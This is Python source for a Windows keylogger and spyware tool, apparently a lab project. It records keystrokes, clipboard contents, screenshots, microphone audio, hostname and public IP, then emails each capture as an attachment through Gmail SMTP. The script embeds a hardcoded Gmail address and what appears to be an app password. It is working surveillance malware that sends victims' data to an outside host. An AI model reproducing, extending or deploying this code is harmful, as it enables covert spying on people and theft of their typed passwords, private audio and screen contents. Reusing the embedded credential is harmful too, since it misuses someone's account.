
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os

from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
microphone_time = 10
time_iteration = 15
email_address = "project5testmail123@gmail.com"
password = "zrgu cujr tajp idvs "
toaddr = "project5testmail123@gmail.com"
file_path = "C:\\Users\\sltec\\Documents\\Personal Projects\\LAB5\\keylogger"
extend = "\\"


## Email ###############
def send_email(filename, attachment, toaddr):
     fromaddr = email_address
     msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
     msg['subject'] = "Log file test"
     body = "Body of the mail"
     msg.attach(MIMEText(body, 'plain'))
     filename = filename
     with open(attachment, 'rb') as attachment_file:  # Use 'with' to handle file properly
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment_file.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f'attachment; filename={filename}')
        msg.attach(p)
     
     try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()  # Enable TLS encryption
        s.login(fromaddr, password)  # Use App Password here
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        print("Email sent successfully!")
     except Exception as e:
        print(f"Failed to send email: {e}")

send_email(keys_info, file_path + extend + keys_info, toaddr)

def computer_information():
     with open(file_path + extend + system_info, "a") as f:
          hostname = socket.gethostname()
          IPAddr = socket.gethostbyname(hostname)
          try:
               public_ip = get("https://api.ipify.org").text
               f.write("public IP Address: " + public_ip + "\n")
          except Exception as e:
               f.write(f"Unable to get the public IP address : {e}")
          f.write("Processor: " + (platform.processor()) + '\n')
          f.write("System: " + platform.system() + " " + platform.version() + '\n')
          f.write("Machine: " + platform.machine() + '\n')
          f.write("Hostname: " + hostname + '\n')
          f.write("Private IP Address: " + IPAddr + '\n')

def copy_clipboard():
     with open(file_path + extend + clipboard_info, "a") as f:
          try:
               win32clipboard.OpenClipboard()
               pasted_data = win32clipboard.GetClipboardData()
               win32clipboard.CloseClipboard()
               f.write("Clipboard Data: \n" + pasted_data)
          except:
               f.write("Clipboard cannot be copied")

def microphone():
     fs = 44100
     seconds = microphone_time
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
     sd.wait()

     write(file_path + extend + audio_info, fs, myrecording)

def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_info)

number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iteration
number_of_iterations_end = 3

while number_of_iterations < number_of_iterations_end:

     count = 0
     keys = []
     def on_press(key):
          global keys, count, current_time
          print(key)
          keys.append(key)
          count += 1
          current_time = time.time()
          #1
          if count >= 1:
               count = 0
               write_file(keys)
               keys = []

     def write_file(keys):
          with open(file_path + extend + keys_info, "a") as f:
               for key in keys:
                    k = str(key).replace("'","")
                    if k.find("space") > 0:
                         f.write('\n')
                         f.close()
                    #2
                    elif k.find("Key") == -1:
                         f.write(k)
                         f.close()

     def on_release(key):
          if key == Key.esc:
               return False
          if current_time > stopping_time:
               return False
     

     with Listener(on_press=on_press, on_release=on_release) as listener:
          listener.join()
     if current_time > stopping_time:
          with open(file_path + extend + keys_info, "w") as f:
               f.write(" ")
          screenshot()
          send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
          copy_clipboard()
          send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)
          microphone()
          send_email(audio_info, file_path + extend + audio_info, toaddr)
          computer_information()
          send_email(system_info, file_path + extend + system_info, toaddr)
